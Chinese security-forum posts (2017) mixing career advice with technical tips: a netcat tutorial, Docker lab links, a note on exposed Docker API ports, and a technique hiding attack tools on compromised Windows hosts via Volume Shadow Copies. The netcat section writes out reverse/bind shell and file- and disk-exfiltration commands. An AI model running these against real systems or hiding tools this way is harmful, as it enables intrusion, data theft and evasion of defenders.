<img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__ replies to <img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 你说的这些大多都在风控规则里面由风控部门通过系统监控

<img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__ replies to <img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__: 略懂。似乎这家单位招的是监控系统运维，最好懂点编程，可以修理系统的人。

<img src="https://file.xiaomiquan.com/e0/68/e068be5010ad7a437c06f83586e6ccbdebe43df1419a8be656e2ff3c763bbc7b.jpg" width="25px"/> __酷陈__ replies to <img src="https://file.xiaomiquan.com/78/e9/78e9ff588e637881e951e6a67a256e8fae0f2bd3cbe34dda75f5839f21405851.jpg" width="25px"/> __吕土金__: 那估计是类似zabbix这类开源监控系统的二次开发？

<img src="https://file.xiaomiquan.com/77/94/7794a6fa7fe3127b708f61d481fc168de96e9be8d2484ddd20ab6edb9153c405.jpg" width="25px"/> __快看这是一只野生的自然卷__: 曾经从事网银与手机银行系统的安全/风险评估，所以提供些参考，对支付系统进行安全评估，可以参考《网上银行系统信息安全通用规范》以及《电子银行安全评估指引》，根据里面的评估内容， 结合人行《非金融机构支付服务管理办法》 制定自己的评估标准，考虑到是安全系统开发，猜测应该是将相关的风险指标整合进安全监控系统，soc一类的，或者业务安全监控，反洗钱，异常交易等，两个领域差异较大，后者很少接触。
（第一次回答好紧张，怎么表情这么少😨）

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/77/94/7794a6fa7fe3127b708f61d481fc168de96e9be8d2484ddd20ab6edb9153c405.jpg" width="25px"/> __快看这是一只野生的自然卷__: 哈哈 谢谢参与互动


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-02:

> 匿名用户 提问：
请教余弦大牛，我毕业后一直在家上班，主要技能是Web渗透(某二线城市)。接一线公司外包的合法渗透项目，工作自由，没有工作压力，老板人好。拿固定月薪，项目完成有1~2K提成提成，毕业后开始五年前从3K慢慢做，到现在12K。没有甲乙方公司工作经验。请问这个收入在圈内如何，还有几年就到而立之年，自感学习能力竞争力已经落后新人，很困惑，不知还能否跳槽，在考虑是否要转安全开发或者安全运维岗位。希望不吝赐教。


你可以这样参考下：一线（如北京），优秀的本科应届毕业生进入乙方（你也是在乙方），月薪 10K 起，这个不仅看是否优秀，还得看如下几个因素：
1. 这个岗位带来的价值多大
2. 公司的营收情况如何

很难简单根据一个人是否优秀来判断他当下收入的，更不可能简单从工作年限来判断一个人的收入。说个很实际的情况，你拿多少收入得看你给企业带去多大的价值，这是上面说的第1点，而如果一个企业发展不好（对应上面说的第2点），也很难给你对等的报酬。对于第2点，如果你觉得这个企业长远来说有前途（或者钱途），那么短期几年不用太在意这些得失。因为一个人拿到的不仅是显现的钱，还有隐性的东西，比如发展。

根据你描述的情况来看，你在家办公，无工作压力，工作5年，现在 12K 月薪。你可以这样算一下呀，如果你在一线城市，且要租房，工作压力很大，那如果是这种状况是拿多少工资？

一线城市 + 25%
租房与路费 + 15%
工作压力 + 20%

这里你得加个 60% 至少，那么如果你在北京这样的一线，此时月薪可以拿到差不多：20 K。工作5年，在北京这个高压的环境，拿到这个数谈不上出众，但也还可以。还不说你有提成拿，我觉得你的老板人确实良心。这个数，仅仅是通过这个简单公式来计算，还没考虑到上面说的那两点。

现在工资来看，好像还行，那么关键问题来了，是否继续这样工作下去：没压力，一直待家里。

没压力是很可怕的一件事，你也感受到了，现在越来越多新人冒出来，可能你的工作分分钟就能被替代掉。还有一直待在家里，远程办公，如果没一个好氛围，这个也很危险，未来几年你的职场能力会被弱化到最低。

跳不跳槽看你自己，在自己还不够牛的时候，找个有压力的好平台当然是最好的，还没到而立之年，并不算迟，即使而立，也有机会。强烈建议你和你觉得不错的这个老板深入聊聊，没什么问题是一次坦然聊天解决不了的，如果有，那么再请吃一顿小龙虾。毕竟你拿 3K 工资开始，服务了5年，这很难得。

希望你走出你的困惑。也希望你把我的这个回答认真看几遍，为了回答好这个问题，我琢磨了很久。



...

<img src="https://file.xiaomiquan.com/72/fe/72fef027248dde86ee50415982509a701aa6139e27d5d73aa54c8e5ac395ff42.jpg" width="25px"/> __Gera2k28__: 一条条账全算出来了😂😂

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: '为了回答好这个问题，我琢磨了很久',这要是没小蜜圈，想得到这些回答，应该不是一顿小龙虾的问题了。

<img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__: 一顿小龙虾难于满足这么多的字😆

<img src="https://file.xiaomiquan.com/b0/f4/b0f49d058f8c5d24072b41b8829dc17977bb306f18ff3312d0ba4d8701458919.jpg" width="25px"/> __Sesameopenx__: 不错不错 非常有参考价值，感谢～

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 洋洋洒洒这么多字，不光是给这个朋友的建议，更是cos的一份心，可以感受到他写这些文字时的真诚！赞一个！

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__: 前有云舒黄焖鸡，今有余弦小龙虾


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-02:


__#工具#__

 基础工具篇之NC
NC 是一个大家都知道的经典工具，可以说它已经比较老旧了，但是我还是认为从事安全工作必须能熟练应用它，因为它不仅功能强大，最最重要是类Linux系统都内置已经存在了。估计大多数人对它功能知晓不全。

1.监听端口
     nc -l -p 5000  (-l设置监听模式；-p设置监听端口)，这个大家用的最多可能是拿来接收反弹shell，就不多说       了。
 2.连接端口
     nc -nv 192.168.1.1 80 (-n 设置不解析域名，直接通过ip来连接； -v 显示详细的输出内容)，IP后面跟的是要连     接的端口，用的最多的应该还是直接连接一个开了监听端口的后门，其实它可以连接一些端口获取banner并执行一     些指令模拟发包。
     一端执行监听，一边用nc连接，那么双方可以发送一些文本信息，来模拟一个聊天工具，当然这在实际中没什么     用，不过变通一下就能起到作用了。
     A:nc -lp 5000   B: ps | nc -nv 192.168.1.1 5000
     A监听端口，B执行命令并将命令回显通过nc传输到A端的屏幕上显示，这常常应用在一些电子取证的场景上，我     们不希望在取证目标磁盘上写入任何东西。就可以通过这种方式来采集目标上的一些信息。
     当然你A端可以直接 nc -l -p 5000 > ps.txt,将接收到的信息直接写入文件。
3.传输文件
     A: nc -lp 5000 > 123.log    B: nc -nv 192.168.1.1 5000 < /var/message.log -q 1  (这里-q代表传输完成后1 秒就断开连接)
     也可以变换成这样反向来传输   A: nc -nv 192.168.1.1 5000 > 123.log    B: nc -lp 5000 < /var/message.log     -q 1 （谁连接这个端口，就自动把message.log发送过去）
4.传输目录
     A: tar -cvf - /tmp | nc -lp 5000 -q 1 (先将/tmp 目录进行打包注意cvf 后面有一个（-）符合，并通过管道符     将数据重定向到nc监听上)
     B: nc -nv 192.168.1.1 5000 | tar -xvf -   (接收到的数据重定向给tar解包)
5.端口扫描
     nc -nvz 192.168.1.1 1-65535 (-z代表扫描模式，不会进行I/O 信息交换，仅仅探测端口开放)
     nc -nvzu 192.168.1.1 1-65535 (-u 代表通过upd方式扫描)
     nc肯定不能代替扫描器，精确度也不怎么好，不建议使用。
6.硬盘克隆
     A: nc -lp 5000 | dd of=/dev/sda (nc监听5000端口，将接收到的数据，通过dd of，将数据完整写到/dev     /sda 磁盘上)
     B: dd if=/dev/sda | nc -nv 192.168.1.1 5000 -q 1 (通过dd if 将/dev/sda 硬盘进行克隆，这个是从硬盘底     层数据的扇区、块上进行复制，克隆出来将会是状态完全一样的硬盘，通过管道重定向给nc命令并传送到远程ip上)
     这个功能常常会用在电子取证上，克隆出一个一样的硬盘，进行数据分析。当然不仅复制硬盘，也可以复制受害机     器的内存。(/proc 文件夹下是内存中的数据)
7.发送shell
     A: nc -lp 5000 -c bash  (-c 调用bash做为交互,如果是windows下改为-e cmd)
     B： nc -nv 192.168.1.1 5000
     当然也可以反向发送shell
     A: nc -nv 192.168.1.1 5000 -c bash
     B: nc -lp 5000
    
弦哥，刚刚转的TK传授的学习方法，学习一个工具，要去看它每个参数，并弄懂其作用，现附上参数中文翻译

     语法 nc/netcat(选项)(参数)
选项 -g<网关>：设置路由器跃程通信网关，最多设置8个；
-d 无命令行界面，使用后台模式
-c 程序重定向，比如-c bash，nc传输过来的数据就会指向bash去执行
-e 这个也是程序重定向，用在windows下
-G<指向器数目>：设置来源路由指向器，其数值为4的倍数；
-h：在线帮助； -i<延迟秒数>：设置时间间隔，以便传送信息及扫描通信端口；
-l：使用监听模式，监控传入的资料；
-L：也是用作监听，不过监听端不终止nc的话，连接端终止后，监听端依然保持监听状态。
-n：直接使用ip地址，而不通过域名服务器；
-o<输出文件>：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；
-p<通信端口>：设置本地主机使用的通信端口；
-r：指定源端口和目的端口都进行随机的选择；
-s<来源位址>：设置本地主机送出数据包的IP地址；
-u：使用UDP传输协议；
-v：显示指令执行过程；
-w<超时秒数>：设置等待连线的时间，一般扫描时加上；
-z：使用0输入/输出模式，只在扫描通信端口时使用。
欢迎大家提交更多的使用方法！



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 非常详细了，赞

<img src="https://file.xiaomiquan.com/11/91/1191aa3c74051c94f3264a52669a61f7404372ae20061499297c4f7a42451a1d.jpg" width="25px"/> __live2know__: 涨知识

<img src="https://file.xiaomiquan.com/99/28/9928dca1cd305a8a8ebc76bd68148776389c75e13988d5f3c2b2b423001d436a.jpg" width="25px"/> __小胆大叔__: 请问这些都是Linux命令吗？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/99/28/9928dca1cd305a8a8ebc76bd68148776389c75e13988d5f3c2b2b423001d436a.jpg" width="25px"/> __小胆大叔__: nc是个工具，有windows和linux版本。

<img src="https://file.xiaomiquan.com/99/28/9928dca1cd305a8a8ebc76bd68148776389c75e13988d5f3c2b2b423001d436a.jpg" width="25px"/> __小胆大叔__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 哦哦，谢谢解惑。刚接触一点不懂😂

<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 请问我使用参数-q 1文件传完没有自动断开，我使用-w 1可以自动断开，这两个参数有什么区别？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__: 你是在传输那边加的-q 1吗？-w 是设置超时时间，一般用在扫描端口上，探测某个端口没反应的等待时间

<img src="https://file.xiaomiquan.com/eb/ce/ebceabace3eaa00f4f49859462d3f03e8c12c7cbb15b2e53c8b2f751ad294dfc.jpg" width="25px"/> __su__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 感谢大大解答。找到原因了，是弄反了，另外比较了一下，linux版带-q，windows版的nc没-q，而且少好几个参数。

<img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__: nc没有官网，去哪下载[囧]

<img src="https://file.xiaomiquan.com/d6/55/d6558b36cc52dd14bcae9f9a3ff02b7d980de0df97e5fef93bfdc01b1037dcd7.jpg" width="25px"/> __F0rever__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 大哥，哪里有安全的下载


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-01:


__#资源#__

 一个使用 docker 部署 Web 漏洞测试环境的github项目，测试环境可随时创建随时删除，十分方便

项目地址：
[GitHub - MyKings/docker-vulnerability-environment:...](https://github.com/MyKings/docker-vulnerability-environment)



环境列表：

    bWAPP
    xssed
    DVWA
    WebGoat
    DVWA-WooYun-edition
    DSVW
    WAVSEP
    OWASP Broken Web Applications Project(未完成)



...

<img src="https://file.xiaomiquan.com/d2/51/d251481e66c6144e32be00ceeedbd707a2bbe024ac5d9b150ce826c26a0b6be6.jpg" width="25px"/> __desword__: 中文的readme

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 没看懂怎么用

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ replies to <img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 先了解docker

<img src="https://file.xiaomiquan.com/88/ba/88baf27d18a55ca81cb25b0279ab02127bac65f1d2a9cdfbc724c0cf7512f7e9.jpg" width="25px"/> __In&eRes7ing__: 特别好特别好

<img src="https://file.xiaomiquan.com/49/4b/494b3ba58404cf4a1e4c92bc17f3865e8afa226cbacfda8e8ce781e1e4ddffea.jpg" width="25px"/> __然__: 很棒


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-01:


__#姿势#__

  有玩 Docker 的同学可以关注这份 Docker 安全部署指南：


[GitHub - GDSSecurity/Docker-Secure-Deployment-Guid...](https://github.com/GDSSecurity/Docker-Secure-Deployment-Guidelines)



这份指南罗列了 Docker 在部署上如果不注意可能会出现的严重安全问题。对这块攻击感兴趣的也可以了解下。

Docker 是非常棒的轻量级虚拟化隔离解决方案，但还不是真正的虚拟机，所以安全上会有不少特别的学问。

我们玩黑的，Docker 有两个研究出发点：

1. 很多安全工具的部署，用 Docker 可以一键安装，非常方便，比如 Kali 可以这样去安装：

docker pull kalilinux/kali-linux-docker

Metasploit 可以这样去安装：

docker pull remnux/metasploit

是不是非常方便？随时随地，用后即删。

2. Docker 本身在部署上如果没做好，是可以黑掉实体机的，还可以恶意操作 Docker 的一些部署行为。

比如之前研究过 Docker 集群管理里的 2375/2376 端口，如果可以被外网访问到，就糟糕了，如列出所有 images：

docker -H 219.2.213.12:2375 images

然后之后还可以执行一系列 Docker 的操作指令，邪恶点可以写个 Docker 蠕虫传播起来。😏

也许会有那么一天，Docker 蠕虫/勒索事件爆发。回到开头，Docker 的安全性得做好，从安全部署习惯开始！



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 已经改名叫moby了

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 参考这段：“Docker改名为Moby了吗？答案已经很明确了，Docker仍然还在，仍然还叫Docker。只是Moby项目已经问世，它是Docker的上游项目，是Docker之母。正因如此，Docker这个名字也已经不适合作为原来源码库的名字了。而对于普通的容器个人使用者或者企业，影响并不是太大。对于一些容器系统厂商和组件提供方，Moby提供了一种新形式的协作平台，可以定制化、增强、适配容器系统等等。”

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 确实方便，管理也简洁明了


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-30:

关于安全新人成长的话题，前些天我分享了些经验，今天转了 TK 的，刚刚看到 yuange 也发了个，授权转载过来，给大家继续参考：

----------

其实很多人他们不是想问要学习什么，而是想问怎么一下得到一甲子功力。很多方面的学习都很简单，你了解原理需要学习哪些知识就从这些知识开始学习。计算机学习很简单，基本的计算机原理、操作系统原理、汇编语言等几样基本功学扎实，再跟踪调试多练习熟练了，你想很差都难。关于这个我都说得不想说了。这些我基本上没走弯路。

可是这有几个人肯自己埋头几年下功夫去学习这些？简单的就连安全行业搞攻防的，有10%真正懂CPU保护模式吗？
难不是难在怎么学习，而是难在这个积累过程。



...

<img src="https://file.xiaomiquan.com/d9/8d/d98d18950409c1a21557e81ea5b11addd5d8e0929702f32011454f6efb1c5892.jpg" width="25px"/> __GEASS__: 都知道欲速则不达，可是在现实中又都想学的快一些再快一些。要么是着急提高效率，要么是想早日收获成果。不知不觉中踏踏实实学习的心却变少了。

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 能快速得到的东西也会快速失去，只有一步一步打下的基础最牢固


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-30:

转自 TK 的内部分享“个人成长”，已获授权。供安全新人们参考。

<img src="https://images.xiaomiquan.com/FivVL0aN3w1B2e5j_3J54b_6E4xR?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Pn81rBC_64ORwfiEvHbbJgDM7QA=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 学习了，都是实践经验。

<img src="https://file.xiaomiquan.com/80/c3/80c3a6e8cc93c7e3dbf226a5b6a14ff7c5ad6da0fbda3b51939c7efec01bbcb3.jpg" width="25px"/> __😍😡-ToSimp__: 😂学习+折腾

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 内部资料哇

<img src="https://file.xiaomiquan.com/9b/52/9b52248b57c6eaf3639d2b39c7b7ee888af58e6ea5ab9045ca4b9dee4f510699.jpg" width="25px"/> __咸鱼__: 问问大佬，现在ss的安全性怎么样，与常规的vpn对比呢

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/9b/52/9b52248b57c6eaf3639d2b39c7b7ee888af58e6ea5ab9045ca4b9dee4f510699.jpg" width="25px"/> __咸鱼__: ss不是为安全而生，不过也挺安全

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/9b/52/9b52248b57c6eaf3639d2b39c7b7ee888af58e6ea5ab9045ca4b9dee4f510699.jpg" width="25px"/> __咸鱼__: 只要注意保证配置正确(预共享密钥别被爆破，算法用aes256），ss服务器可信就好。至于被gfw检测出来，我只知道ss在这方面也做过升级，应该是个博弈过程，不过它的流量特征比vpn要难检测得多

<img src="https://file.xiaomiquan.com/9b/52/9b52248b57c6eaf3639d2b39c7b7ee888af58e6ea5ab9045ca4b9dee4f510699.jpg" width="25px"/> __咸鱼__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 谢谢大佬

<img src="https://file.xiaomiquan.com/7d/22/7d22de0d89f5eee63f931b7ee84a3b8ea7fd48312453571b6e89a7b827d4e526.jpg" width="25px"/> __Langley__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 分支太多了而且安全并没加强很多，像后面加的OTA 也依然还是存在被探查的可能，看墙越不愿意了，ss 还算是活的比较久的了

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/7d/22/7d22de0d89f5eee63f931b7ee84a3b8ea7fd48312453571b6e89a7b827d4e526.jpg" width="25px"/> __Langley__: 不是ota，ota已弃用


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-29:


__#经验#__

  之前说玩安全/黑客，编程的重要性，现在说下英语的重要性。

略去一万字，反正很重要。😅

那么如何提升呢，最简单的方式是养成每天阅读安全领域专业英语的好习惯，比如每天早上及晚上都刷一遍 Twitter，你可以看看我都关注了谁（我的账号是 @evilcos），把我关注的都可以考虑关注。我每天刷的过程中，会持续关注新的账号，你也会。

刚开始会很痛苦，毕竟陌生词量肯定不少，那就查呀背呀，把高考时人生最巅峰的战斗力拿出来呀。

好习惯一旦养成，会很受益的。到时候记得感谢我今天写下的这段文字。

对了，昨天有圈友问我是如何做到快速应急响应的，其实你看我刷 Twitter 那么的快速，就知道我为什么可以快速获取第一手安全/黑客情报了吧？

最后，平衡好自己的时间，不要动不动就去刷，工作期间该认真工作就认真工作，业余时间该认真陪女友就认真陪...

时间太碎片，会很糟糕。



...

<img src="https://file.xiaomiquan.com/48/be/48be85e6b7a165166bfa45b96e8eb79c5d18e696eba6d3b68bf15b1da245c0fb.jpg" width="25px"/> __天天穿毛裤__: 在美国学信息安全的飘过~~💪

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/be/48be85e6b7a165166bfa45b96e8eb79c5d18e696eba6d3b68bf15b1da245c0fb.jpg" width="25px"/> __天天穿毛裤__: 你这真是得天独厚的优势，哈哈

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 英语目前自己最大问题

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 明年就不是了😏

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 好，相信老司机的，每天刷推特✊

<img src="https://file.xiaomiquan.com/48/be/48be85e6b7a165166bfa45b96e8eb79c5d18e696eba6d3b68bf15b1da245c0fb.jpg" width="25px"/> __天天穿毛裤__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 是呀，当初考托福GRE，几百页的单词书背了近20遍，不过现在看英文资料一点问题都没有，回报率那是杠杠的✌️

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 想到了以前看到的一篇文章“HOW TO BE A HACKER”😝

<img src="https://file.xiaomiquan.com/36/27/3627128908f9e2da0298fefe94350d8186d407f6110aa9c3a0ba06f4c33254f6.jpg" width="25px"/> __　__: 要学好英语，想要学有所成，最好找去培训。可以留意奥运、世界杯等著名活动背后那些提供英语培训支持的教育机构。决定好了，就准备好钱、时间、精力当作母语去学习！

<img src="https://file.xiaomiquan.com/41/76/417629e7354d5f9cf952b32c8e99cf4d330f29ed23a58569d72fd03b72fd725c.jpg" width="25px"/> __我__ replies to <img src="https://file.xiaomiquan.com/48/be/48be85e6b7a165166bfa45b96e8eb79c5d18e696eba6d3b68bf15b1da245c0fb.jpg" width="25px"/> __天天穿毛裤__: 学长，我也准备去美国读信息安全相关的本科。有什么建议吗？

<img src="https://file.xiaomiquan.com/94/09/94091e1d81feca327f8cfb1a97ba6f917599e83731a52018be918372a919f16e.jpg" width="25px"/> __dolf__ replies to <img src="https://file.xiaomiquan.com/36/27/3627128908f9e2da0298fefe94350d8186d407f6110aa9c3a0ba06f4c33254f6.jpg" width="25px"/> __　__: 举个栗子来？ 认可哪些教育机构？

<img src="https://file.xiaomiquan.com/48/be/48be85e6b7a165166bfa45b96e8eb79c5d18e696eba6d3b68bf15b1da245c0fb.jpg" width="25px"/> __天天穿毛裤__ replies to <img src="https://file.xiaomiquan.com/41/76/417629e7354d5f9cf952b32c8e99cf4d330f29ed23a58569d72fd03b72fd725c.jpg" width="25px"/> __我__: 好好练听力！因为大部分老师是阿三😂。然后主要还是自学能力一定要强，遇到阿三老师，讲完课就跑了，很多东西还是自己去图书馆啃💪

<img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__ replies to <img src="https://file.xiaomiquan.com/94/09/94091e1d81feca327f8cfb1a97ba6f917599e83731a52018be918372a919f16e.jpg" width="25px"/> __dolf__: 个人认为如果肯自学英语的话。成就感很大

<img src="https://file.xiaomiquan.com/82/82/82825b7290b34936832ec9ff5972ecb1fc30b8ee53d26751f4601f50470e4117.jpg" width="25px"/> __星辰大海__: 国内是怎么上推的？😅

<img src="https://file.xiaomiquan.com/2b/f9/2bf9e6206c897d781f31230a6f9923b346da1a247d2a1822470bf25995a3659f.jpg" width="25px"/> __winlans__ replies to <img src="https://file.xiaomiquan.com/82/82/82825b7290b34936832ec9ff5972ecb1fc30b8ee53d26751f4601f50470e4117.jpg" width="25px"/> __星辰大海__: vpn

<img src="https://file.xiaomiquan.com/34/67/34670901cfe95bb707b2e89bf45d6b8f30fd46af445923331ac80a871991f14b.jpg" width="25px"/> __咯吱咯__: 过来人给个建议，听力很重要，不要背单词……


...

---

<img src="https://file.xiaomiquan.com/49/38/493819414cee64e85bb9339ad2d5f28a809a1f8d45dba90f290aec07ec882a72.jpg" width="25px"/> __Moriarty@ATToT__ on 2017-06-29:

渗透技巧之隐藏自己的工具
大家在做内网渗透的时候，经常要传一些工具到目标机器上执行。有的时候传一次，执行完了就删除了，后来发现还要再用，又要再次上传，很是麻烦而且也容易造成被发现的风险。有的圈友可能会把工具放到一个很深的目录里藏起来，但是这种工具长期放在目标机器上又不安全。今天我给大家介绍一个猥琐的小技巧，可以放心的把工具放在目标机器上，而又不会被发现。
这里利用的就是VSS（Volume Shadow Copy），首先我们将工具上传到目标机器的某个目录里（比如c:\$Recycler.Bin),我这里方便测试，在c盘新建了一个目录test，并把工具传到了此目录里。然后我们创建C盘的VSS，这里我们可以利用微软的vssadmin工具（我的windows 2008里自带这个工具），如果没有这个工具我们可以利用wmi来操作：
1.创建VSS：
vssadmin create shadow /for=c:
或者
（Get-WmiObject Win32_ShadowCopy -List).Create("C:\","ClientAccessible")
这里记住返回的ShadowID（类似{eeb50055-34c9-472b-81e6-ed111742e12e}）
2.删除你上传的工具（我这里是直接把C:\test目录删除掉）
